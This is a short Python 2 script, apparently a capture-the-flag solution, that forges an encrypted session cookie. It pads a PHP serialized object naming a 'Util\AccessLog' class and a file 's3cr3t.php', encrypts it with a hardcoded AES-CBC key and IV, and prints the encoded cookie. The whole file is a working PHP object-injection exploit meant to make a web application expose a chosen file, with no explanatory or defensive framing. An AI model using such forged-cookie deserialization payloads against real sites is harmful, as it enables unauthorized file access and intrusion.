from Crypto.Cipher import AES
from  urllib import quote
import base64


#AES
def pad(s):
	return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)

def encrypt(key, plain, IV):
	cipher = AES.new(key, AES.MODE_CBC, IV)
	return cipher.encrypt(plain)

def decrypt(key, ciphertext, IV):
	cipher = AES.new(key, AES.MODE_CBC, IV)
	return cipher.decrypt(ciphertext)
#



key = 'tH1$iSS3CrEtk3Y\x00'
iv = 'sEcR3t1VsEcR3t1V'

data = pad('O:14:"Util\AccessLog":1:{s:8:"fileName";s:10:"s3cr3t.php";}')
cookie = quote(base64.b64encode(encrypt(key, data, iv)))

print('Cookie: {}'.format(cookie))









